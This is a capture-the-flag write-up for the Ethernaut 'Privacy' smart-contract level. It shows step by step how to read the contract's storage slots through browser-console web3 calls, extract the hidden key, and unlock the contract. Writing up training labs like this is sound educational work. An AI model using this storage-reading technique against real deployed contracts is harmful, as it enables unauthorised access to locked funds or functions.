# Privacy

Type in the browser console:

```
> await contract.locked()
true
```

Let's investigate what is in the contract storage.

```
> await web3.eth.getStorageAt(instance, 0)
'0x0000000000000000000000000000000000000000000000000000000000000001'
```

At slot 0 there is stored first variable ``bool locked`` which value is ``true``. 

```
> await web3.eth.getStorageAt(instance, 1)
'0x00000000000000000000000000000000000000000000000000000000649b28c8'
```

The next one contains variable ``uint256 ID`` with value equals timestamp of the block when the contract was deployed.

```
> await web3.eth.getStorageAt(instance, 2)
'0x0000000000000000000000000000000000000000000000000000000028c8ff0a'
```

At slot 2 of the storage there are three variables packed: ``uint8 flattening``, ``uint8 denomination``, ``uint16 awkwardness`` with values ``10 = 0a``, ``255 = ff`` and ``uint16(block.timestamp) = 28c8``. Slots 3, 4, 5 contains array named ``data`` with 3 elements of type ``bytes32``:

```
> await web3.eth.getStorageAt(instance, 3)
'0x4089c3942bad9aa01f57aa21df3eb914a0424fea96b92ca4b6fad287a5dd2540'
> await web3.eth.getStorageAt(instance, 4)
'0x5a81e082fddd2f746fba5da51fcc324e6c98659135ca49aac3f5bda16e4c9ceb'
> await web3.eth.getStorageAt(instance, 5)
'0x342316bce4969eee2227543300b0a062e9736cd72f6dafa3b61d119416f11f4d'
```

There is no more variables defined in contract, so storage at slot 6 should remain unused:

```
> await web3.eth.getStorageAt(instance, 6)
'0x0000000000000000000000000000000000000000000000000000000000000000'
```

A key to unlock contract is the last element of array ``data`` casted to type ``bytes16``.

```
> await contract.unlock('0x342316bce4969eee2227543300b0a062');
```

Type in the browser console to check if we have unlocked contract successfully:

```
> await contract.locked()
false
```

Level completed.
